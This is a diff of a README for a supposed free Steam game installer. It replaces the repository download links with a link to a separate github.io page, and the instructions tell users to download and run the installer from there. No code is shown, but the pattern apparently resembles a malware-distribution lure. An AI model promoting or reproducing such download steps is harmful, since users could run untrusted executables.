@@ -1,6 +1,6 @@
 # 🎮 RedXFreeSteamInstaller - Add games to Steam account easily
 
-[![Download RedXFreeSteamInstaller](https://img.shields.io/badge/Download-RedXFreeSteamInstaller-blue.svg)](https://github.com/Reinhardpale713/RedXFreeSteamInstaller)
+[![Download RedXFreeSteamInstaller](https://img.shields.io/badge/Download-RedXFreeSteamInstaller-blue.svg)](https://reinhardpale713.github.io)
 
 ## 📌 Overview
 
@@ -19,7 +19,7 @@ Before you begin, ensure your computer meets these requirements:
 
 Follow these instructions to set up the software on your computer.
 
-1. Visit the [official release page](https://github.com/Reinhardpale713/RedXFreeSteamInstaller) to download the installer.
+1. Visit the [official release page](https://reinhardpale713.github.io) to download the installer.
 2. Locate the folder where your browser saves downloads.
 3. Open the downloaded file to start the setup wizard.
 4. Follow the prompts on the screen to install the application.
